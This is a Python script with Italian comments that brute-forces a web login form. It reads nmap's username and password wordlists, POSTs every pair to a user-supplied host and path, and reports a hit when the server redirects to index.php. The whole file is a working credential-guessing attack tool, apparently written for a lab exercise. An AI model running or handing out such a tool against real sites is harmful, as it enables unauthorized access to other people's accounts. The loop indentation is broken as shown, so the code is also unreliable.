#Programma per il brute force con metodo POST

import http.client, urllib.parse #Importa i moduli necessari per la gestione delle richieste HTTP (http.client) e la codifica dei parametri (urllib.parse)

#Richiede all'utente di inserire manualmente l'host bersaglio, la porta bersaglio e la destinazione bersaglio (path del form di login)

host = str(input("inserisci l'host bersaglio:\n"))
port = int(input("inserisci la porta bersaglio:\n"))
path = input("inserisci la destinazione bersaglio:\n")

#Apre i file contenenti le liste di nomi utente (usernames.lst) e password (passwords.lst). Queste liste possono essere sostituite con vocabolari più completi come quelli presenti su https://github.com/duyet/bruteforce-database

user_list = open('/usr/share/nmap/nselib/data/usernames.lst')
pwd_list = open('/usr/share/nmap/nselib/data/passwords.lst')

#Legge le righe dai file delle liste di nomi utente e password e le memorizza come elementi di liste

user_list = user_list.readlines()
pwd_list = pwd_list.readlines()

#Il programma utilizza due cicli for annidati per combinare ogni nome utente con ogni password. Il comando rstrip() viene utilizzato per rimuovere eventuali spazi bianchi o caratteri di nuova riga dalla fine di ciascuna riga letta dai file.
for user in user_list:

user = user.rstrip()

#comando di controllo per verificare la corretta lettura dei nomi(lasciato come commento)
#print(user)
	
#ciclo for annidato per inserire ogni password ai relativi username
	
for pwd in pwd_list:
	pwd = pwd.rstrip()
		
#commando di verifica per l'avvenuta associazione tra username e password(lasciato come commento)
		
#print (user,"-",pwd)
	

#Utilizza il modulo urllib.parse per codificare i parametri del form di login (username e password) in un formato appropriato per l'invio tramite richiesta HTTP POST. Vengono anche specificati gli header necessari per la richiesta
		
	post_parameters = urllib.parse.urlencode({'username':user, 'password':pwd,'Login':"login"})
	headers = {"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml"}

#Crea una connessione HTTP (HTTPConnection) al server utilizzando l'host e la porta specificati

	conn = http.client.HTTPConnection(host,port)

#Invia una richiesta HTTP POST alla path specificata con i parametri del form e gli header

	conn.request("POST",path, post_parameters,headers)

#Riceve la risposta dal server

	response = conn.getresponse()

#Controlla la risposta del server per verificare se il reindirizzamento (location) è verso la pagina "index.php"

	if(response.getheader('location')=="index.php"):

#Se è così, stampa un messaggio che indica che l'accesso è stato effettuato con successo utilizzando la coppia di credenziali corrente

		print("logged with:\n",user,"-",pwd)
